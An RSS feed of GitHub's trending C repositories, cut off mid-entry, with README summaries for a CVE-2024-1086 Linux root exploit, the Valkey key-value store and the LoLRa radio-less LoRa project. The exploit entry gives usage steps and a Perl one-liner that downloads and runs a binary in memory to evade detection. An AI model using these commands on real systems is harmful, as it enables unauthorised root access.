<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-03-29T01:25:10Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Notselwyn/CVE-2024-1086</title>
    <updated>2024-03-29T01:25:10Z</updated>
    <id>tag:github.com,2024-03-29:/Notselwyn/CVE-2024-1086</id>
    <link href="https://github.com/Notselwyn/CVE-2024-1086" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2024-1086&lt;/h1&gt; &#xA;&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-1086&#34;&gt;CVE-2024-1086&lt;/a&gt;, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&#34;&gt;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Blogpost / Write-up&lt;/h2&gt; &#xA;&lt;p&gt;A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the &lt;a href=&#34;https://pwning.tech/nftables/&#34;&gt;Flipping Pages blogpost&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Affected versions&lt;/h2&gt; &#xA;&lt;p&gt;The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&amp;gt;, v6.1.76&amp;gt;, v6.6.15&amp;gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Caveats:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The exploit does not work v6.4&amp;gt; kernels with kconfig &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y&lt;/code&gt; (including Ubuntu v6.5)&lt;/li&gt; &#xA; &lt;li&gt;The exploits requires user namespaces (kconfig &lt;code&gt;CONFIG_USER_NS=y&lt;/code&gt;), that those user namespaces are unprivileged (sh command &lt;code&gt;sysctl kernel.unprivileged_userns_clone&lt;/code&gt; = 1), and that nf_tables is enabled (kconfig &lt;code&gt;CONFIG_NF_TABLES=y&lt;/code&gt;). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro&#39;s have not been tested, but may work as well.&lt;/li&gt; &#xA; &lt;li&gt;The exploit may be unstable on systems with a lot of network activity &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.&lt;/li&gt; &#xA;   &lt;li&gt;On test devices, please turn off WiFi adapters through BIOS.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in &lt;a href=&#34;https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/src/config.h&#34;&gt;&lt;code&gt;src/config.h&lt;/code&gt;&lt;/a&gt;. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase &lt;code&gt;CONFIG_PHYS_MEM&lt;/code&gt;. If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle &lt;code&gt;CONFIG_REDIRECT_LOG&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; to avoid unnecessary network activity.&lt;/p&gt; &#xA;&lt;h3&gt;Building&lt;/h3&gt; &#xA;&lt;p&gt;If this is impractical for you, there is an &lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit&#34;&gt;compiled x64 binary&lt;/a&gt; with the default config.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/Notselwyn/CVE-2024-1086&#xA;cd CVE-2024-1086&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Binary: &lt;code&gt;CVE-2024-1086/exploit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Running&lt;/h3&gt; &#xA;&lt;p&gt;Running the exploit is just as trivial:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./exploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;perl -e &#39;&#xA;  require qw/syscall.ph/;&#xA;&#xA;  my $fd = syscall(SYS_memfd_create(), $fn, 0);&#xA;  system &#34;curl https://example.com/exploit -s &amp;gt;&amp;amp;$fd&#34;;&#xA;  exec {&#34;/proc/$$/fd/$fd&#34;} &#34;memfd&#34;;&#xA;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;The programs and scripts (&#34;programs&#34;) in this software directory/folder/repository (&#34;repository&#34;) are published, developed and distributed for educational/research purposes only. I (&#34;the creator&#34;) do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>valkey-io/valkey</title>
    <updated>2024-03-29T01:25:10Z</updated>
    <id>tag:github.com,2024-03-29:/valkey-io/valkey</id>
    <link href="https://github.com/valkey-io/valkey" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A new project to resume development on the formerly open-source Redis project. We&#39;re calling it Valkey, like a Valkyrie.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;This README is under construction as we work to build a new community driven high performance key-value store.&lt;/p&gt; &#xA;&lt;p&gt;This project was forked from the open source Redis project right before the transition to their new source available licenses.&lt;/p&gt; &#xA;&lt;p&gt;This README is just a fast &lt;em&gt;quick start&lt;/em&gt; document. We are currently working on a more permanent documentation page.&lt;/p&gt; &#xA;&lt;h2&gt;What is Valkey?&lt;/h2&gt; &#xA;&lt;p&gt;Valkey is a high-performance data structure server that primarily serves key/value workloads. It supports a wide range of native structures and an extensible plugin system for adding new data structures and access patterns.&lt;/p&gt; &#xA;&lt;h2&gt;Building Valkey&lt;/h2&gt; &#xA;&lt;p&gt;Valkey can be compiled and used on Linux, OSX, OpenBSD, NetBSD, FreeBSD. We support big endian and little endian architectures, and both 32 bit and 64 bit systems.&lt;/p&gt; &#xA;&lt;p&gt;It may compile on Solaris derived systems (for instance SmartOS) but our support for this platform is &lt;em&gt;best effort&lt;/em&gt; and Valkey is not guaranteed to work as well as in Linux, OSX, and *BSD.&lt;/p&gt; &#xA;&lt;p&gt;It is as simple as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build with TLS support, you&#39;ll need OpenSSL development libraries (e.g. libssl-dev on Debian/Ubuntu) and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make BUILD_TLS=yes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build with systemd support, you&#39;ll need systemd development libraries (such as libsystemd-dev on Debian/Ubuntu or systemd-devel on CentOS) and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make USE_SYSTEMD=yes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To append a suffix to Valkey program names, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make PROG_SUFFIX=&#34;-alt&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can build a 32 bit Valkey binary using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make 32bit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After building Valkey, it is a good idea to test it using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If TLS is built, running the tests with TLS enabled (you will need &lt;code&gt;tcl-tls&lt;/code&gt; installed):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./utils/gen-test-certs.sh&#xA;% ./runtest --tls&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Fixing build problems with dependencies or cached build options&lt;/h2&gt; &#xA;&lt;p&gt;Valkey has some dependencies which are included in the &lt;code&gt;deps&lt;/code&gt; directory. &lt;code&gt;make&lt;/code&gt; does not automatically rebuild dependencies even if something in the source code of dependencies changes.&lt;/p&gt; &#xA;&lt;p&gt;When you update the source code with &lt;code&gt;git pull&lt;/code&gt; or when code inside the dependencies tree is modified in any other way, make sure to use the following command in order to really clean everything and rebuild from scratch:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make distclean&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will clean: jemalloc, lua, hiredis, linenoise and other dependencies.&lt;/p&gt; &#xA;&lt;p&gt;Also if you force certain build options like 32bit target, no C compiler optimizations (for debugging purposes), and other similar build time options, those options are cached indefinitely until you issue a &lt;code&gt;make distclean&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;h2&gt;Fixing problems building 32 bit binaries&lt;/h2&gt; &#xA;&lt;p&gt;If after building Valkey with a 32 bit target you need to rebuild it with a 64 bit target, or the other way around, you need to perform a &lt;code&gt;make distclean&lt;/code&gt; in the root directory of the Valkey distribution.&lt;/p&gt; &#xA;&lt;p&gt;In case of build errors when trying to build a 32 bit binary of Valkey, try the following steps:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install the package libc6-dev-i386 (also try g++-multilib).&lt;/li&gt; &#xA; &lt;li&gt;Try using the following command line instead of &lt;code&gt;make 32bit&lt;/code&gt;: &lt;code&gt;make CFLAGS=&#34;-m32 -march=native&#34; LDFLAGS=&#34;-m32&#34;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Allocator&lt;/h2&gt; &#xA;&lt;p&gt;Selecting a non-default memory allocator when building Valkey is done by setting the &lt;code&gt;MALLOC&lt;/code&gt; environment variable. Valkey is compiled and linked against libc malloc by default, with the exception of jemalloc being the default on Linux systems. This default was picked because jemalloc has proven to have fewer fragmentation problems than libc malloc.&lt;/p&gt; &#xA;&lt;p&gt;To force compiling against libc malloc, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make MALLOC=libc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To compile against jemalloc on Mac OS X systems, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make MALLOC=jemalloc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Monotonic clock&lt;/h2&gt; &#xA;&lt;p&gt;By default, Valkey will build using the POSIX clock_gettime function as the monotonic clock source. On most modern systems, the internal processor clock can be used to improve performance. Cautions can be found here: &lt;a href=&#34;http://oliveryang.net/2015/09/pitfalls-of-TSC-usage/&#34;&gt;http://oliveryang.net/2015/09/pitfalls-of-TSC-usage/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;To build with support for the processor&#39;s internal instruction clock, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make CFLAGS=&#34;-DUSE_PROCESSOR_CLOCK&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Verbose build&lt;/h2&gt; &#xA;&lt;p&gt;Valkey will build with a user-friendly colorized output by default. If you want to see a more verbose output, use the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make V=1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Running Valkey&lt;/h2&gt; &#xA;&lt;p&gt;To run Valkey with the default configuration, just type:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to provide your valkey.conf, you have to run it using an additional parameter (the path of the configuration file):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-server /path/to/valkey.conf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is possible to alter the Valkey configuration by passing parameters directly as options using the command line. Examples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./valkey-server --port 9999 --replicaof 127.0.0.1 6379&#xA;% ./valkey-server /etc/valkey/6379.conf --loglevel debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All the options in valkey.conf are also supported as options using the command line, with exactly the same name.&lt;/p&gt; &#xA;&lt;h2&gt;Running Valkey with TLS:&lt;/h2&gt; &#xA;&lt;p&gt;Please consult the &lt;a href=&#34;https://raw.githubusercontent.com/valkey-io/valkey/unstable/TLS.md&#34;&gt;TLS.md&lt;/a&gt; file for more information on how to use Valkey with TLS.&lt;/p&gt; &#xA;&lt;h2&gt;Playing with Valkey&lt;/h2&gt; &#xA;&lt;p&gt;You can use valkey-cli to play with Valkey. Start a valkey-server instance, then in another terminal try the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-cli&#xA;valkey&amp;gt; ping&#xA;PONG&#xA;valkey&amp;gt; set foo bar&#xA;OK&#xA;valkey&amp;gt; get foo&#xA;&#34;bar&#34;&#xA;valkey&amp;gt; incr mycounter&#xA;(integer) 1&#xA;valkey&amp;gt; incr mycounter&#xA;(integer) 2&#xA;valkey&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Installing Valkey&lt;/h2&gt; &#xA;&lt;p&gt;In order to install Valkey binaries into /usr/local/bin, just use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use &lt;code&gt;make PREFIX=/some/other/directory install&lt;/code&gt; if you wish to use a different destination.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;make install&lt;/code&gt; will just install binaries in your system, but will not configure init scripts and configuration files in the appropriate place. This is not needed if you just want to play a bit with Valkey, but if you are installing it the proper way for a production system, we have a script that does this for Ubuntu and Debian systems:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd utils&#xA;% ./install_server.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: &lt;code&gt;install_server.sh&lt;/code&gt; will not work on Mac OSX; it is built for Linux only.&lt;/p&gt; &#xA;&lt;p&gt;The script will ask you a few questions and will setup everything you need to run Valkey properly as a background daemon that will start again on system reboots.&lt;/p&gt; &#xA;&lt;p&gt;You&#39;ll be able to stop and start Valkey using the script named &lt;code&gt;/etc/init.d/valkey_&amp;lt;portnumber&amp;gt;&lt;/code&gt;, for instance &lt;code&gt;/etc/init.d/valkey_6379&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Code contributions&lt;/h2&gt; &#xA;&lt;p&gt;Please see the &lt;a href=&#34;https://github.com/valkey-io/valkey/raw/unstable/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;. For security bugs and vulnerabilities, please see &lt;a href=&#34;https://github.com/valkey-io/valkey/raw/unstable/SECURITY.md&#34;&gt;SECURITY.md&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>cnlohr/lolra</title>
    <updated>2024-03-29T01:25:10Z</updated>
    <id>tag:github.com,2024-03-29:/cnlohr/lolra</id>
    <link href="https://github.com/cnlohr/lolra" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Transmit LoRa Frames Without a Radio&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;LoLRa&lt;/h1&gt; &#xA;&lt;p&gt;&lt;em&gt;Transmit 900MHz LoRa frames surprisingly far without a radio&lt;/em&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#background&#34;&gt;Background&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#lorawan&#34;&gt;LoRaWAN&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#limitations&#34;&gt;Limitations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#future_Work&#34;&gt;Future Work&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#resources&#34;&gt;Resources&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#special_thanks&#34;&gt;Special Thanks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/#range_tests&#34;&gt;Range Tests&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;Firmware-only LoRa transmission, for a variety of processors. Send LoRa packets, without any radio, chips, external hardware or built-in radios at all on a variety of common, inexpensive processors. While not truly bit banging, this repository shows how using either a shift register (i.e. I2S or SPI port) or an APLL, you can send LoRa packets that can be decoded by commercial off the shelf LoRa gateways and other chips.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] This repo is designed for use with ITU Region 2 (The Americas) tageting 902-928MHz. Code changes are needed for use in Region 1 (EU, Russia, Afraica) to target 863-870MHz or Region 3 (Australia, China, India) to target 920-923MHz.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!CAUTION] Because we rely on harmonics and aliasing, the primary frequency components emitted by your microcontroller are going to be in portions of the RF spectrum where RF transmissions are banned. Please filter your output or perform your tests in an area where you are unlikely to leak significant RF. The overall EIRP output is genreally ≪300uW across the whole spectrum spread out over hundreds of emission frequencies, but there is virtually no way a device deliberately transmitting on these frequencies could ever pass FCC part 15 compliance, even with filtering.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;There are two major modes that this repository works with.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Transmission using a tunable PLL, creating a square wave, then using a harmonic (the 13th harmonic in the case of the ESP32-S2) and then transmitting the signal out a clock out pin.&lt;/li&gt; &#xA; &lt;li&gt;Direct synthesis on a bitstream, a much more versatile method able to work on a myriad of microcontrollers. This creates an image of the intended bitstream up at 900 MHz, even in situations where the bitstream itself can be as low as 7.2 MSPS. But for most platforms, I&#39;ve targeted between 24 and 173 MSPS.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Click Below for the Youtube Video version of this page:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=eIdHBDSQHyw&#34;&gt;&lt;img src=&#34;https://i3.ytimg.com/vi/eIdHBDSQHyw/maxresdefault.jpg&#34; alt=&#34;LoRa Without A Radio&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] Portions of code in this repo are under various licenses and cannot be trivially incorporated into other libraries without a bit of a mess, including a no-ai-training license for any of the RF-specific portions of the project. Be cautious when using code from this repo. See &lt;img src=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/LICENSE&#34; alt=&#34;LICENSE&#34;&gt; for more information.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Background&lt;/h2&gt; &#xA;&lt;h3&gt;Square waves, and images&lt;/h3&gt; &#xA;&lt;p&gt;Any time a signal changes state from low to high or high to low, a disturbance is created in the electromagnetic fields surrounding that wire. Any time. The difference is, are you, as an engineer, going to fear it, squelching it waddling, being afraid of whatever EMI it might cause, or are you going to grab the bull by its horns and emit some artisanally crafted signals? The major principles you will need to understand are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The actual emission of a wave is made from several frequency components at different frequencies and phases. You can read more about it &lt;a href=&#34;https://mathworld.wolfram.com/FourierSeriesSquareWave.html&#34;&gt;in this wolfram article&lt;/a&gt; or &lt;a href=&#34;https://www.youtube.com/watch?v=spUNpyF58BY&#34;&gt;This 3Brown1Blue Video&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/SquareHarmonics.png?raw=true&#34; alt=&#34;Square 220 Hz&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A pure sinewave has only its principle output wave in frequency space.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/SineHarmonics.png?raw=true&#34; alt=&#34;Sine 220 Hz&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can create a high frequency tone by generating a low frequency tone (Pictured is a 13th harmonic of at 69.420MHz signal)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/SineTop.png?raw=true&#34; alt=&#34;Single Tone&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can spread a signal over an area of spectrum by scanning it between frequencies. (There are other ways, but that isn&#39;t LoRa)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/SquareTop.png?raw=true&#34; alt=&#34;Signal Spread&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Square waves are actually several &#34;odd harmonic&#34; frequencies all added together.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/36mhz-up-the-spectrum.png?raw=true&#34; alt=&#34;Signal Going Up Spectrum&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It is important to note that many more cheap micros frequencies cut off rather quickly at high frequencies.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/UpSpectrumSad.png?raw=true&#34; alt=&#34;Up Spectrum Sad&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The second principle is signal mixing. If you create a signal, then &#34;mix&#34; it with a high frequency, you get an &#34;image&#34; wrapped around that high frequency. Mixing can be done with diodes, special RF equipment, or even just sampling, like that done by using a shift register, outputting bits at a steady rate.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/UpSpectrumImages.png?raw=true&#34; alt=&#34;Signal Mixing&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Now the real magic happens, when you realize these two principles actually work together. You get an image at the base band, a reflected image around the sampling frequency, then around ×3 the sampling frequency, you get another 2 images, the forward and reverse. And ×5, and ×7, etc.&lt;/p&gt; &#xA;&lt;p&gt;With this, with a precise enough clock, we can arbitrarily generate any frequency we wish, provided there&#39;s enough bandwidth left on the GPIO of our micro to generate it, even if the &#34;actual&#34; signal we&#39;re generating is much much lower in frequency.&lt;/p&gt; &#xA;&lt;h4&gt;A side-note: RC/RLC oscillators vs crystal oscillators.&lt;/h4&gt; &#xA;&lt;p&gt;Internal oscillators in microcontrollers aren&#39;t only inaccurate, but they also jitter around in frequency. You might think this a negative, but in fact, using the internal oscillator built into micros can often be a lifesaver, getting you past EMI/EMC. Because the internal oscillators aren&#39;t just imprecise but jittery, they prevent harmonics of individual frequencies higher up in the spectrum because the clock rate drifts around so heavily.&lt;/p&gt; &#xA;&lt;p&gt;Crystal Output: &lt;img src=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/resources/CrystalOut.png&#34; alt=&#34;Crystal Output&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;RC Output: &lt;img src=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/resources/RCOut.png&#34; alt=&#34;RC Output&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;LoRa signals (40,000&#39; view)&lt;/h3&gt; &#xA;&lt;p&gt;See the section below for the nitty gritty of how LoRa signals &lt;em&gt;actually work&lt;/em&gt; or the things that none of the other PhDs on the internet ever were willing to tell you about it.&lt;/p&gt; &#xA;&lt;p&gt;LoRa typically operates in the 433MHz or the 900MHz spectrum, usually with 125kHz channels. In principle, LoRa creates chirps, starting at one frequency, 62.5kHz below the channel center, then over a short period of time (1.024uS at SF7) the tone creeps up to 62.5kHz above the channel center.&lt;/p&gt; &#xA;&lt;p&gt;While LoRa can be used with many different channel widths, 125kHz and 500kHz are both very well supported, whereas other channel widths are not configurable with routers like the LR9.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/resources/bitstreamdiagram.png&#34; alt=&#34;Bitstream Analysis&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This diagram shows frequency on the X axis, and time on the Y axis (top to bottom)... You can see:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;𝔸&lt;/strong&gt; our output on a platform like the CH32V203 is not perfect, that&#39;s because the SPI bus on the CH32V203 glitches by parts of a bit here and there. This causes other, weaker images in the output. But, largely we can produce totally valid and readable (at a long distance) LoRa packets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;𝔹&lt;/strong&gt; LoRa consists of several upchirps some in a preamble.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;ℂ&lt;/strong&gt; two more upchirps with a phase offset indicating a sync word if we select 0x43 (or 0x34 depending on endian) for the upchirps here, our packets will be decoded and potentially forwarded by commercial LoRa gateways.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;𝔻&lt;/strong&gt; 2.25 down chrips in. That extra .25 causes some pain 😈 (the minimum logical unit is a quarter chirp, not a whole chirp).&lt;/li&gt; &#xA; &lt;li&gt;Then a payload where each upchirp is offset by a phase to convey information in &lt;strong&gt;𝔼&lt;/strong&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Conveniently the window for a given chirp is stable depending on the spreading factor. For the above packet, with SF7, it works out to 1,024us per symbol, or for SF8, 2,048us per symbol. Each symbol/chirp can represent a number of bits, by a phase offset.&lt;/p&gt; &#xA;&lt;p&gt;The raw &#34;phase&#34; of a chirp is grey-coded in order to better spread the bit error between bits to higher layers of the process. For instance, if you are off-by-one with regards to the phase you believe the chirp is at, it could be over a boundary from say 0b1111 and 0b10000 and would cause 5 bit errors. By grey coding it, it minimizes the bit errors created by an off-by-one or even a few of the phase.&lt;/p&gt; &#xA;&lt;p&gt;After this raw bitstream is decoded from the individual chirps and de-grey-coded (see &lt;code&gt;encodeHamming84sx&lt;/code&gt;) in &lt;a href=&#34;https://github.com/cnlohr/lolra/raw/master/lib/LoRa-SDR-Code.h&#34;&gt;&lt;code&gt;LoRa-SDR-Code.h&lt;/code&gt;&lt;/a&gt;, then we transpose/interleve the bits so any one symbol that could get taken out (see &lt;code&gt;diagonalInterleaveSx&lt;/code&gt;) to spread any errors out so a single lost symbol can be recovered and whitened (I believe this is actually a worthless step in this protocol, correct me if I&#39;m wrong) see &lt;code&gt;Sx1272ComputeWhitening&lt;/code&gt;. Above whitening is an error correction layer to help fix any of the bit errors that could happen at a lower layer (see &lt;code&gt;encodeFec&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Overall the messages have a header, and a payload. Note that this can be a little tricky, because the header sometimes uses different encoding settings than the payload. And that&#39;s it.&lt;/p&gt; &#xA;&lt;p&gt;Once you generate properly formatted packets, you can encode them into chirps and transmit them out the wire.&lt;/p&gt; &#xA;&lt;p&gt;A more detailed view of the protocol can be found &lt;a href=&#34;https://dl.acm.org/doi/10.1145/3546869&#34;&gt;here, for a more academic view&lt;/a&gt; and &lt;a href=&#34;https://chrisye-liu.github.io/files/yang22emu.pdf&#34;&gt;here for some better 